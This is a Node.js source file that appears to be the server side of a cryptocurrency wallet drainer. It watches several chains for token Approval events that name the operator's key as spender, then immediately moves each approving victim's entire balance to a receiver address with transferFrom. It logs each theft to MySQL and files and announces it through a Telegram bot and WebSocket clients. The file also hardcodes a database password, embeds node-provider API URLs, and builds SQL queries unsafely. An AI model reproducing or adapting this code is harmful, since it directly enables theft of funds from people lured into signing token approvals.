var argv = require('minimist')(process.argv.slice(2));
const fs = require("fs")
var { log, logSuccess, logError, logWaning, COLOR, encodedStr } = require("./std");
const clc = require("cli-color")

const { WebSocketServer } = require('ws');

const Web3 = require("web3")
const CHAINS = require("./CHAINS");
var request = require('request');
var moment = require("moment")

var mysql = require('mysql');


var privateKey = argv.k.trim();

var spender = (new Web3()).eth.accounts.privateKeyToAccount(privateKey).address
var receiver = spender
var Settings = null;

if (argv.receiver) receiver = argv.receiver.toString();

logWaning("spender", spender)
logWaning("receiver", receiver)


var db = {
    saveAppoved: async function (content) {
        if (!content.note) content.note = "NULL";
        let sql = `insert into wea.approveds
    (transactionHash, chainId, symbol, owner, spender, note)
    VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.owner}', '${content.spender}', ${content.note});`

        this.con.query(sql, function (err, result) {
            if (err && !err.code.includes("ER_DUP_ENTRY")) throw err;
            // console.log("saveAppoved: " + result);
        });
    },

    saveTransfered: async function (content) {
        if (!content.note) content.note = "NULL";
        let sql = `insert into wea.transfereds
    (transactionHash, chainId, symbol, from, to, value, note)
    VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.from}', '${content.to}', '${content.value}', ${content.note});`

        this.con.query(sql, function (err, result) {
            if (err && !err.code.includes("ER_DUP_ENTRY")) throw err;
            // console.log("saveTransfered: " + result);
        });
    },

    saveError: async function (error) {
        let json = JSON.stringify(error).replaceAll("'", "\\'")
        let sql = `insert into wea.transfererrors
    (error)  VALUES('${json}');`

        this.con.query((sql), function (err, result) {
            if (err) throw err;
            // console.log("saveError: " + result);
        });
    },

    con: null,

    config: {
        host: "localhost",
        user: "sammy",
        password: "NewP@ssword6789"
    },

    connect: async function () {
        return new Promise((rs, rj) => {
            let connection = mysql.createConnection(this.config);

            connection.connect((err) => {
                if (err) rj(err)
                console.log('connected db as id ' + connection.threadId);
                this.con = connection;
                rs(connection);
            });
        })
    },
}


// log(privateKey)
// log(COLOR.Clear);

async function loadSettings(file = "settings.json") {
    let content = fs.readFileSync(file, "utf8");
    let settings = JSON.parse(content)
    receiver = settings.receiver
    Settings = settings;
    return settings;

}

async function saveSettings(settings, file = "settings.json") {
    let content = JSON.stringify(settings)
    fs.writeFileSync(file, content, "utf8");
}

function loadQuicknode(file = "quicknode.json") {
    let content = fs.readFileSync(file, "utf8")
    return JSON.parse(content)
}

function sendMessageClient(message, allClient = true, clientId = 0) {
    if (allClient) {
        clients.forEach(ws => {
            ws.send(JSON.stringify(message))
        });
    }
}

async function appendFile(filePath, content) {
    let fd = fs.openSync("data/" + filePath, 'a+');
    fs.appendFileSync(fd, content + "\n", 'utf8');
}

async function sentAlertTelegram(content, type = "success", settings = Settings) {
    let color = "#49c74e"
    switch (type) {
        case "warning":
            color = "#ff9800";
            break;
        case "success":
            color = "#49c74e";
            break;
        case "error":
            color = "#e100007a";
            break;
    }
    let message = encodeURIComponent(`<code style="color: ${color}">${JSON.stringify(content)}</code>`)
    var options = {
        'method': 'POST',
        'url': `https://api.telegram.org/bot${settings.telegram.token}/sendMessage?chat_id=${settings.telegram.chatId}&text=${message}&parse_mode=html`,
        'headers': {
        }
    };
    request(options, function (error, response) {
        if (error) logError("sentAlertTelegram error:", error.message)
        // console.log(response.body);
    });
}

async function sendToken(web3, symbol, contract, from, to) {
    const gasPrice = await web3.eth.getGasPrice();
    let allowance = await contract.methods.allowance(from, spender).call();
    let balance = await contract.methods.balanceOf(from).call();
    let decimals = await contract.methods.decimals().call();
    let chainId = await web3.eth.net.getId();
    // larger 10$
    let min = 10 * (10 ** decimals);
    if (allowance > min && balance > min) {
        const gasEstimate = await contract.methods.transferFrom(from, to, balance).estimateGas({ from: spender });
        log('sendToken', from, to, spender);
        contract.methods.transferFrom(from, to, balance).send({ from: spender, gasPrice: gasPrice, gas: gasEstimate }).then(async r => {
            let content = {
                onSent: {
                    chainId: chainId,
                    symbol: symbol,
                    from: from,
                    to: to,
                    value: balance,
                    transactionHash: r.transactionHash,
                }
            }
            try {
                db.saveTransfered(content.onSent)
                appendFile("transfereds.txt", JSON.stringify(content.onSent))
                logSuccess('transferFrom Success')
                sendMessageClient(content)
                sentAlertTelegram(content)

            } catch (error) {
                throw error;
            }
        }).catch(error => {

            let content = {
                chain: web3.eth.networkVersion,
                symbol: symbol,
                from: from,
                to: to,
                error: error.message
            }

            try {
                db.saveError({ error: error.message }).catch()
                appendFile("transferedsError.txt", JSON.stringify(content))
                sendMessageClient({ error: error.message })
                sentAlertTelegram({ error: error.message })
                logError("transferedsError: ", error.message)
                // logError(error)
            } catch (error) {
                throw error;
            }
        });
    } else {
        logError("smaller 10$:", "allowance:", allowance / 10 ** decimals, "balance:", balance / 10 ** decimals)
    }
}

function listenEvents(settings = Settings) {
    let { tokens, abiFolder } = settings
    let web3s = []
    let contracts = []
    let quicknode = loadQuicknode()
    Object.keys(tokens).map(symbol => {
        Object.keys(tokens[symbol]).map(async id => {
            let chainId = parseInt(id)
            let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
            log(abiPath, fs.existsSync(abiPath), symbol, chainId)
            let abi = JSON.parse(fs.readFileSync(abiPath, "utf-8"))

            if (chainId == 1337 || chainId == 5777) {
                abi = abi.abi; chainId = 5777;
            }

            let rpc = quicknode[chainId].link

            let provider;
            if (rpc.startsWith("ws")) {
                provider = new Web3.providers.WebsocketProvider(rpc)
            } else {
                provider = new Web3(rpc)
            }

            let web3 = new Web3(provider)
            web3.eth.accounts.wallet.add(privateKey)

            let contract = new web3.eth.Contract(abi, tokens[symbol][chainId].address)
            contract.events.Approval({ filter: { "spender": spender } }, (error, event) => {
                if (error) {
                    logError(symbol, chainId, error);
                    let content = {
                        "symbol": symbol, "chainId": chainId, error: error.message
                    }
                    db.saveError(content).catch(console.error)
                    appendFile("approvalError.txt", content)
                    sendMessageClient(content)
                    sentAlertTelegram(content)
                } else {
                    logSuccess(chainId, symbol)
                    // log(event.transactionHash, event.returnValues.owner)
                    let content = {
                        onApproval: {
                            chainId: chainId,
                            symbol: symbol,
                            owner: event.returnValues.owner,
                            spender: event.returnValues.spender,
                            transactionHash: event.transactionHash,
                        }
                    }
                    db.saveAppoved(content.onApproval).catch(err => {
                        logError(err)
                        if (err.sqlMessage.includes("Duplicate entry"));
                        else db.saveError(error)
                    })
                    appendFile("approveds.txt", JSON.stringify(content.onApproval))
                    sendMessageClient(content)
                    sentAlertTelegram(content)
                    sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
                }
            })

            web3s.push(web3)
            contracts.push(contract)
        })
    })
    return web3s, contracts;
}


loadSettings()
    .then(async settings => {
        db.config = settings.database
        db.connect().then(c => {
            let web3s, contracts = listenEvents(settings)
            // sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))

        })
    })
// .catch(error => logError(error))
var port = 8080;
if (argv.port) port = argv.port.trim();
else if (argv.p) port = argv.p;

var clients = []

const wss = new WebSocketServer({ port: port });

wss.on('connection', (ws) => {
    clients.push(ws)
    let id = clients.length
    logSuccess(id, 'connections')
    ws.on('message', (data) => {
        let msg = JSON.parse(data)

        console.log("%s: %s", id, msg.pk);
        sendMessageClient({ "message": "hi " + id })
    });

    ws.send(`{ "message": "hi ${id}" }`);
    ws.onclose = (e) => {
        clients.slice(id, 1)
        logError("onclose ws " + id)
    }
});

/*  */


/* test create web3 and listen event */
// let web3 = new Web3(new Web3.providers.WebsocketProvider("wss://winter-muddy-cloud.discover.quiknode.pro/d146c8fcb93455ee90fe69422a012137e6eb28c3/"))
// // let web3 = new Web3("https://mainnet.infura.io/v3/d41e02ee7f344eb6ba4b9239f853de51")
// let abi = JSON.parse(fs.readFileSync("public/contracts/USDC_ABI_1.json"))
// let contract = new web3.eth.Contract(abi, "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF")
// contract.events.Approval({}, (err, event) => {
//     if (err) throw err
//     log(event)
// })